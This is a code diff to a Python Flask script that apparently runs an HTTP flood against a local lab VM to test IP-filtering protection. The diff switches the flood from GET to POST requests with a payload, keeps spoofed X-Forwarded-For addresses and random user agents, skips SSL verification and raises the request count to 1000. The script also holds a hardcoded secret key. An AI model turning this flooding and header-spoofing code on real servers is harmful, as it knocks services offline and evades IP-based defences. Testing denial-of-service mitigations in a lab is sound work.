@@ -5,7 +5,6 @@ import random
 import urllib3
 from datetime import datetime, timedelta
 import time
-import ipaddress
 import socket
 import os
 import hmac
@@ -44,6 +43,7 @@ SECRET_KEY = "mysecretkey"
 
 app = Flask(__name__)
 
+
 @app.route("/verify_request", methods=["POST"])
 def verify_request():
     try:
@@ -64,7 +64,6 @@ def verify_request():
 
     except Exception as e:
         return f"Error verifying request: {str(e)}"
-
 
 
 def show_logs():
@@ -113,9 +112,10 @@ def http_flood(target_url, num_of_requests):
             # Set block_for_testing to True for testing w/ protection and False otherwise
             if not ip_filtering(vm_ip, block_for_testing=False):
                 # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
-                # Send HTTP Get request with random user agent
-                send_request = requests.get(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
-                                            verify=False)
+                # Send HTTP POST request with random user agent and payload
+                payload = {'key1': 'value1', 'key2': 'value2'}  # Example payload
+                send_request = requests.post(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
+                                             data=payload, verify=False)
                 print(f"Request status: {send_request.status_code}")
                 print()
             else:
@@ -157,7 +157,7 @@ def first_check():
 
 if __name__ == "__main__":
     target_url = "http://10.0.2.15/real-estate-html-template/index.html"
-    num_of_requests = 100
+    num_of_requests = 1000
 
     print(f"Starting http flood, targeting {target_url}")
 
